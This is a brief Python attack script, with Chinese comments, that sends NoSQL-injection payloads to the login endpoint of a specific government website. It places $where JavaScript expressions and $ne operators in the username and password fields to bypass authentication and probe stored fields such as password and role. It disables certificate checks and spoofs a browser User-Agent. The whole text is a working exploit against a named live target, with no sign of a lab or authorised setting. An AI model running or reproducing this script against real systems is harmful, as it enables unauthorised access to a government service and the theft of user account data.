import requests, urllib3, time
urllib3.disable_warnings()
BASE="https://epcr.tpf.gov.tw:4004"
def login_full(body):
    s=requests.Session(); s.verify=False; s.headers.update({"User-Agent":"Mozilla/5.0"})
    s.get(BASE+"/captcha",timeout=10)
    r=s.post(BASE+"/login", json=body, timeout=10)
    return r.status_code, r.text[:80]

print("=== $where 访问 this.source 字段做白名单过滤 ===")
# this 指向用户文档. 测试 this.source 是否存在及值
exprs=[
  'this.source=="localhost"',
  'this.source=="AUTH_SERVER"',
  'this.source=="epcr.tpf.gov.tw"',
  'this.source!=null',
  'typeof this.source=="string"',
  'this.password!=null',
  'this.role!=null',
]
for e in exprs:
    body={"username":{"$where":e},"password":{"$ne":None},"captcha":"1","domain":"AUTH_SERVER"}
    try:
        sc,tx=login_full(body); time.sleep(0.06)
        print(f"  $where({e:28s}) -> {sc} {tx}")
    except Exception as ex:
        print(f"  $where({e}) ERR {repr(ex)[:40]}")
